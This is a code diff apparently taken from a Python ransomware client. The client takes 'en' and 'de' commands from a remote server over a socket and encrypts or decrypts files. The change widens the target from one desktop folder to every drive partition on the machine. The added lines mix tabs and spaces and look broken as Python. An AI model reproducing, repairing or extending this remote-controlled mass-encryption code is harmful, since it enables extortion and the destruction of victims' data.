@@ -122,14 +122,18 @@ def client():
             command = s.recv(2048)
             command = command.decode('ascii')
             if command == "en":
-                files = dir_f_list('C:\\Users\\Eng_Ozil\\Desktop\\new')
-                for f in files :
-                    encryption(key,f)
+                parts = partition_windows()
+                for part in parts :
+                    files = dir_f_list(part)
+					for f in files:
+                        encryption(key,f)
                 s.send("\n Encryption Has been Done\n")
             if command == "de":
-                files = dir_f_list('C:\\Users\\Eng_Ozil\\Desktop\\new')
-                for f in files :
-                    decryption(key,f)
+                parts = partition_windows()
+				for part in parts :
+					files = dir_f_list(part)
+					for f in files : 
+						decryption(key,f)
                 s.send(b'\n Decryption Has been Done\n')
     except socket.error as e:
         print("trying to connect with server with in 5 sec")
